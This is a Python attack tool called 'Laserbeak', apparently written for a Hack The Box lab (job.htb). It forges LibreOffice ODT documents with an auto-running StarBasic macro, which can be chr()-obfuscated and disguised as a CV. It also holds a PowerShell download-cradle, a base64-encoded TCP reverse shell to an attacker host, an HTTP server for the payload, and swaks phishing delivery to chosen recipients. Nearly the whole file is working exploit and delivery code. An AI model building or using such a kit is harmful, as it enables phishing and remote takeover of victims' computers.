#!/usr/bin/env python3
"""
Laserbeak - Decepticon Infiltration System
ODT Macro Injector | Phishing Document Generator
Part of the Soundwave Decepticon Recon Suite
"""

import argparse
import base64
import os
import shutil
import subprocess
import sys
import threading
import zipfile
import http.server
import socketserver

# ─── Colors ───────────────────────────────────────────────────────────────────
VIOLET = '\033[0;35m'
RED    = '\033[0;31m'
YELLOW = '\033[0;33m'
NC     = '\033[0m'

def v(msg):    print(f"{VIOLET}{msg}{NC}")
def ok(msg):   print(f"{VIOLET} [+] {msg}{NC}")
def err(msg):  print(f"{RED} [!] {msg}{NC}")
def inf(msg):  print(f"{VIOLET} [*] {msg}{NC}")
def warn(msg): print(f"{YELLOW} [?] {msg}{NC}")

# ─── Banner ───────────────────────────────────────────────────────────────────
def banner():
    v("")
    v("  _                        _                      _    ")
    v(" | |    __ _ ___  ___ _ __| |__   ___  __ _  ___| | __")
    v(" | |   / _` / __|/ _ \ '__| '_ \ / _ \/ _` |/ __| |/ /")
    v(" | |__| (_| \__ \  __/ |  | |_) |  __/ (_| | (__|   < ")
    v(" |_____\__,_|___/\___|_|  |_.__/ \___|\__,_|\___|_|\_\\")
    v("")
    v("        [ Decepticon Infiltration System ]              ")
    v("        [ ODT Macro Injector — Phishing Forge ]         ")
    v("        [ Soundwave's eyes inside enemy lines ]         ")
    v("")

# ─── ODT Templates ────────────────────────────────────────────────────────────
MACRO_XBA = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" script:name="Module1" script:language="StarBasic">
Sub AutoOpen()
    Shell "{payload}"
End Sub
</script:module>'''

SCRIPT_LC = '''<?xml version="1.0" encoding="UTF-8"?>
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Module1"/>
</library:library>'''

LIBRARIES_LC = '''<?xml version="1.0" encoding="UTF-8"?>
<library:libraries xmlns:library="http://openoffice.org/2000/library">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>'''

# event-name="on-load" — corrigé (était "onLoad", non reconnu par LibreOffice)
CONTENT_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
 xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
 xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
 xmlns:dom="http://www.w3.org/2001/xml-events"
 xmlns:xlink="http://www.w3.org/1999/xlink"
 office:version="1.2">
<office:scripts>
 <office:event-listeners>
  <script:event-listener script:language="StarBasic"
   script:event-name="on-load"
   script:macro-name="Standard.Module1.AutoOpen"
   dom:event-type="dom:load"/>
 </office:event-listeners>
</office:scripts>
<office:body><office:text><text:p>{body}</text:p></office:text></office:body>
</office:document-content>'''

STYLES_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"/>'''

# Basic/Libraries/libraries.xml ajouté — manquant dans la version précédente
MANIFEST_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:full-path="/"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/Standard/Module1.xba"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/Standard/script-lc.xml"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/script-lc.xml"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/Libraries/libraries.xml"/>
</manifest:manifest>'''

MIMETYPE = "application/vnd.oasis.opendocument.text"

# ─── Payload Presets ──────────────────────────────────────────────────────────
PRESETS = {
    "calc":   "cmd /c calc.exe",
    "whoami": "cmd /c whoami > C:\\Windows\\Temp\\out.txt",
    "ping":   "cmd /c ping -n 1 {lhost}",
    # TTP validé sur job.htb : IEX depuis http.server Kali
    "iex":    'cmd.exe /C ""powershell.exe -nop -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\'http://{lhost}:{lport_http}/{ps_file}\'))""',
}

# ─── PS reverse shell builder ─────────────────────────────────────────────────
def build_revshell_ps1(lhost: str, lport: str) -> str:
    return (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);"
        f"$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()"
    )

# ─── Payload builder ──────────────────────────────────────────────────────────
def build_payload(args) -> str:
    if args.preset:
        p = PRESETS.get(args.preset)
        if not p:
            err(f"Unknown preset '{args.preset}'. Available: {', '.join(PRESETS)}")
            sys.exit(1)
        fmt = {}
        if "{lhost}" in p:
            if not args.lhost:
                err("--lhost required for this preset")
                sys.exit(1)
            fmt["lhost"] = args.lhost
        if "{lport_http}" in p:
            fmt["lport_http"] = getattr(args, 'lport_http', None) or "8383"
        if "{ps_file}" in p:
            fmt["ps_file"] = getattr(args, 'ps_file', None) or "rev.ps1"
        return p.format(**fmt)

    if args.cmd:
        return args.cmd

    if getattr(args, 'ps_payload', None):
        return f"cmd /c powershell -NoP -NonI -W Hidden -e {args.ps_payload}"

    if args.lhost and getattr(args, 'lport', None):
        inf(f"Generating embedded PS reverse shell → {args.lhost}:{args.lport}")
        ps  = build_revshell_ps1(args.lhost, args.lport)
        b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
        return f"cmd /c powershell -NoP -NonI -W Hidden -e {b64}"

    err("No payload specified. Use --preset, --cmd, --lhost/--lport, or -p")
    sys.exit(1)

# ─── Macro obfuscation ────────────────────────────────────────────────────────
def obfuscate_macro(payload: str) -> str:
    inf("Applying macro obfuscation (chr() encoding)...")
    encoded = ' & '.join([f'Chr({ord(c)})' for c in payload])
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" script:name="Module1" script:language="StarBasic">
Sub AutoOpen()
    Dim s As String
    s = {encoded}
    Shell s
End Sub
</script:module>'''

# ─── ODT structure builders ───────────────────────────────────────────────────
def create_blank_odt(tmp_dir: str, body: str = ""):
    os.makedirs(f"{tmp_dir}/META-INF", exist_ok=True)
    os.makedirs(f"{tmp_dir}/Basic/Standard", exist_ok=True)
    os.makedirs(f"{tmp_dir}/Basic/Libraries", exist_ok=True)

    with open(f"{tmp_dir}/mimetype", "w") as f:
        f.write(MIMETYPE)
    with open(f"{tmp_dir}/META-INF/manifest.xml", "w") as f:
        f.write(MANIFEST_XML)
    with open(f"{tmp_dir}/content.xml", "w") as f:
        f.write(CONTENT_XML.format(body=body))
    with open(f"{tmp_dir}/styles.xml", "w") as f:
        f.write(STYLES_XML)
    with open(f"{tmp_dir}/Basic/Libraries/libraries.xml", "w") as f:
        f.write(LIBRARIES_LC)


def inject_macro_files(tmp_dir: str, macro_xba: str):
    os.makedirs(f"{tmp_dir}/Basic/Standard", exist_ok=True)
    os.makedirs(f"{tmp_dir}/Basic/Libraries", exist_ok=True)

    with open(f"{tmp_dir}/Basic/Standard/Module1.xba", "w") as f:
        f.write(macro_xba)
    with open(f"{tmp_dir}/Basic/Standard/script-lc.xml", "w") as f:
        f.write(SCRIPT_LC)
    with open(f"{tmp_dir}/Basic/script-lc.xml", "w") as f:
        f.write(LIBRARIES_LC)
    with open(f"{tmp_dir}/Basic/Libraries/libraries.xml", "w") as f:
        f.write(LIBRARIES_LC)

    # Patch manifest si base ODT importée
    manifest_path = f"{tmp_dir}/META-INF/manifest.xml"
    if os.path.isfile(manifest_path):
        with open(manifest_path, "r") as f:
            manifest = f.read()
        for path in [
            'Basic/Standard/Module1.xba',
            'Basic/Standard/script-lc.xml',
            'Basic/script-lc.xml',
            'Basic/Libraries/libraries.xml',
        ]:
            if path not in manifest:
                manifest = manifest.replace(
                    "</manifest:manifest>",
                    f' <manifest:file-entry manifest:media-type="" manifest:full-path="{path}"/>\n</manifest:manifest>'
                )
        with open(manifest_path, "w") as f:
            f.write(manifest)


def pack_odt(tmp_dir: str, output: str):
    """mimetype doit être premier et non compressé — spec ODT obligatoire."""
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(os.path.join(tmp_dir, "mimetype"), "mimetype", compress_type=zipfile.ZIP_STORED)
        for root, dirs, files in os.walk(tmp_dir):
            for file in sorted(files):
                fp      = os.path.join(root, file)
                arcname = fp.replace(tmp_dir + "/", "")
                if arcname == "mimetype":
                    continue
                z.write(fp, arcname)

# ─── Loot check ───────────────────────────────────────────────────────────────
def loot_check(output: str):
    v("")
    v("  ── LOOT CHECK ─────────────────────────────────────────")
    with zipfile.ZipFile(output, "r") as z:
        for name in sorted(z.namelist()):
            size = z.getinfo(name).file_size
            ok(f"  {name:<48} ({size} bytes)")

    critical = [
        "mimetype",
        "META-INF/manifest.xml",
        "content.xml",
        "Basic/Standard/Module1.xba",
        "Basic/Standard/script-lc.xml",
        "Basic/script-lc.xml",
        "Basic/Libraries/libraries.xml",
    ]

    v("")
    v("  ── STRUCTURE VALIDATION ───────────────────────────────")
    all_ok = True
    with zipfile.ZipFile(output, "r") as z:
        names   = z.namelist()
        content = z.read("content.xml").decode()

        for path in critical:
            if path in names:
                ok(f"  ✓ {path}")
            else:
                err(f"  ✗ MISSING: {path}")
                all_ok = False

        if 'script:event-name="on-load"' in content:
            ok('  ✓ event-name="on-load" (correct)')
        elif 'script:event-name="onLoad"' in content:
            err('  ✗ event-name="onLoad" — macro will NOT trigger')
            all_ok = False
        else:
            warn('  ? event-name not found in content.xml')

    v("")
    if all_ok:
        ok("  Structure valid — document should trigger on open")
    else:
        err("  Structure incomplete — fix before sending")
    v("")

# ─── HTTP Server ──────────────────────────────────────────────────────────────
class SilentHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        inf(f"HTTP  [{self.client_address[0]}] {args[0]} {args[1]}")
    def log_error(self, format, *args):
        warn(f"HTTP ERR [{self.client_address[0]}] {format % args}")


def start_http_server(port: int, directory: str):
    os.chdir(directory)
    with socketserver.TCPServer(("", port), SilentHandler) as httpd:
        httpd.serve_forever()

# ─── forge ────────────────────────────────────────────────────────────────────
def forge(args):
    tmp_dir = "/tmp/laserbeak_tmp"
    if os.path.exists(tmp_dir):
        shutil.rmtree(tmp_dir)

    payload = build_payload(args)
    inf(f"Payload  : {payload[:100]}{'...' if len(payload) > 100 else ''}")

    if getattr(args, 'obfuscate', False):
        macro_xba = obfuscate_macro(payload)
    else:
        macro_xba = MACRO_XBA.format(payload=payload.replace('"', '&quot;'))

    if getattr(args, 'input', None) and os.path.isfile(args.input):
        inf(f"Base ODT : {args.input}")
        with zipfile.ZipFile(args.input, "r") as z:
            z.extractall(tmp_dir)
    else:
        inf("Base ODT : generating blank document")
        create_blank_odt(tmp_dir, getattr(args, 'body', '') or "")

    inject_macro_files(tmp_dir, macro_xba)
    pack_odt(tmp_dir, args.output)
    shutil.rmtree(tmp_dir)

    ok(f"Document forged → {args.output}")
    ok(f"Trigger        → Sub AutoOpen() [on-load]")

    if getattr(args, 'loot', False):
        loot_check(args.output)

# ─── deliver ──────────────────────────────────────────────────────────────────
def deliver(args):
    if not shutil.which("swaks"):
        err("swaks not found. Install: sudo apt install swaks")
        sys.exit(1)

    attach = getattr(args, 'attach', None) or getattr(args, 'output', None)
    if not all([args.to, args.from_addr, args.server, attach]):
        err("Delivery requires --to, --from, --server, --attach")
        sys.exit(1)

    cmd = [
        "swaks",
        "--to",        args.to,
        "--from",      args.from_addr,
        "--server",    args.server,
        "--port",      str(args.smtp_port),
        "--h-Subject", getattr(args, 'subject', 'Application') or "Application",
        "--body",      getattr(args, 'mail_body', '') or "Please find the attached document.",
        "--attach",    f"@{attach}",
    ]

    inf(f"Transmitting → {args.to} via {args.server}:{args.smtp_port}")
    subprocess.run(cmd)
    ok("Message transmitted.")

# ─── chain ────────────────────────────────────────────────────────────────────
def chain(args):
    """
    Full chain :
      1. Génère rev.ps1 dans serve_dir
      2. Lance http.server en background (daemon thread)
      3. Forge le .odt avec preset iex
      4. Livre via swaks si params SMTP fournis
      5. Affiche hint listener et reste vivant pour le http.server
    """
    lport_http = getattr(args, 'lport_http', None) or "8383"
    lport      = getattr(args, 'lport', None)      or "4444"
    ps_file    = getattr(args, 'ps_file', None)    or "rev.ps1"
    serve_dir  = getattr(args, 'serve_dir', None)  or os.getcwd()
    output     = getattr(args, 'output', None)     or "cv.odt"

    # 1. Générer rev.ps1
    ps_path = os.path.join(serve_dir, ps_file)
    with open(ps_path, "w") as f:
        f.write(build_revshell_ps1(args.lhost, lport))
    ok(f"rev.ps1 written → {ps_path}")

    # 2. HTTP server en background
    inf(f"Starting HTTP server on :{lport_http} serving {serve_dir}")
    t = threading.Thread(
        target=start_http_server,
        args=(int(lport_http), serve_dir),
        daemon=True
    )
    t.start()
    ok(f"HTTP server running on 0.0.0.0:{lport_http}")

    # 3. Forge ODT
    args.preset     = "iex"
    args.lport_http = lport_http
    args.ps_file    = ps_file
    args.output     = output
    args.lport      = lport
    args.cmd        = None
    args.ps_payload = None
    args.loot       = True
    forge(args)

    # 4. Deliver si SMTP fourni
    if getattr(args, 'to', None) and getattr(args, 'from_addr', None) and getattr(args, 'server', None):
        args.attach = output
        deliver(args)
    else:
        warn("SMTP params not provided — skipping delivery")
        inf(f"Send manually:")
        inf(f"  swaks --to <TO> --from <FROM> --server <IP> --attach @{output}")

    # 5. Listener hint
    v("")
    v("  ── LISTENER ───────────────────────────────────────────")
    inf(f"  rlwrap nc -lvnp {lport}")
    v("")
    v("   Laserbeak is airborne. Waiting for callback.")
    v("   Till all are one.")
    v("")

    try:
        inf("HTTP server running — Ctrl+C to stop")
        t.join()
    except KeyboardInterrupt:
        ok("Laserbeak recalled.")

# ─── CLI ──────────────────────────────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        prog="laserbeak.py",
        description="Laserbeak — Decepticon ODT Macro Injector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{VIOLET}── FORGE ──────────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py forge --preset whoami -o test.odt --loot
  python3 laserbeak.py forge --preset iex --lhost 10.10.14.10 -o cv.odt
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o cv.odt
  python3 laserbeak.py forge --cmd "cmd /c calc.exe" -o test.odt --loot
  python3 laserbeak.py forge -i template.odt --lhost 10.10.14.10 --lport 4444 -o evil.odt
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 --obfuscate -o evil.odt

{VIOLET}── DELIVER ────────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py deliver --to victim@target.htb --from hr@target.htb \\
    --server 10.10.11.X --attach cv.odt --subject "CV Application"

{VIOLET}── FULL CHAIN (forge + http.server + deliver) ─────────────────────────{NC}
  # Avec delivery SMTP
  python3 laserbeak.py chain \\
    --lhost 10.10.14.10 --lport 4444 --lport-http 8383 \\
    --to career@job.local --from hr@job.local --server 10.129.X.X -o cv.odt

  # Sans delivery (forge + http.server uniquement)
  python3 laserbeak.py chain --lhost 10.10.14.10 --lport 4444 -o cv.odt
"""
    )

    sub = parser.add_subparsers(dest="command")

    # ── forge ──
    fp = sub.add_parser("forge", help="Build malicious ODT document")
    fp.add_argument("-i", "--input",     help="Base ODT template")
    fp.add_argument("-o", "--output",    default="malicious.odt")
    fp.add_argument("--body",            help="Decoy text content")
    fp.add_argument("--obfuscate",       action="store_true", help="chr() macro obfuscation")
    fp.add_argument("--loot",            action="store_true", help="Validate ODT structure after forge")
    fp.add_argument("--lhost",           help="LHOST")
    fp.add_argument("--lport",           default="4444",  help="LPORT rev shell (default: 4444)")
    fp.add_argument("--lport-http",      dest="lport_http", default="8383", help="HTTP port for iex preset (default: 8383)")
    fp.add_argument("--ps-file",         dest="ps_file",  default="rev.ps1", help="PS filename for iex preset (default: rev.ps1)")
    pg = fp.add_mutually_exclusive_group()
    pg.add_argument("-p", "--ps-payload", dest="ps_payload", help="Base64 PS payload")
    pg.add_argument("--cmd",              help="Raw shell command")
    pg.add_argument("--preset",           help=f"Preset: {', '.join(PRESETS.keys())}")

    # ── deliver ──
    dp = sub.add_parser("deliver", help="Send ODT via SMTP (swaks)")
    dp.add_argument("--to",         required=True, dest="to")
    dp.add_argument("--from",       required=True, dest="from_addr")
    dp.add_argument("--server",     required=True)
    dp.add_argument("--port",       dest="smtp_port", default=25, type=int)
    dp.add_argument("--attach",     required=True)
    dp.add_argument("--subject",    default="Application")
    dp.add_argument("--mail-body",  dest="mail_body", default="Please find the attached document.")

    # ── chain ──
    cp = sub.add_parser("chain", help="Full chain: forge + http.server + optional deliver")
    cp.add_argument("--lhost",      required=True, help="LHOST (Kali IP)")
    cp.add_argument("--lport",      default="4444",  help="LPORT rev shell (default: 4444)")
    cp.add_argument("--lport-http", dest="lport_http", default="8383", help="HTTP server port (default: 8383)")
    cp.add_argument("--ps-file",    dest="ps_file",  default="rev.ps1", help="PS filename to serve (default: rev.ps1)")
    cp.add_argument("--serve-dir",  dest="serve_dir", default=None, help="Directory to serve (default: cwd)")
    cp.add_argument("-o", "--output", default="cv.odt")
    cp.add_argument("-i", "--input",  help="Base ODT template")
    cp.add_argument("--body",         help="Decoy text content")
    cp.add_argument("--obfuscate",    action="store_true")
    # SMTP optionnel
    cp.add_argument("--to",          dest="to",        default=None)
    cp.add_argument("--from",        dest="from_addr", default=None)
    cp.add_argument("--server",      default=None, help="SMTP server IP")
    cp.add_argument("--port",        dest="smtp_port", default=25, type=int)
    cp.add_argument("--subject",     default="Application")
    cp.add_argument("--mail-body",   dest="mail_body", default="Please find the attached document.")

    args = parser.parse_args()

    if args.command == "forge":
        forge(args)
        v("")
        v("   Laserbeak is airborne. The document is ready.")
        v("   Till all are one.")
        v("")
    elif args.command == "deliver":
        deliver(args)
        v("")
        v("   Laserbeak returns to Soundwave. Mission complete.")
        v("   Till all are one.")
        v("")
    elif args.command == "chain":
        chain(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
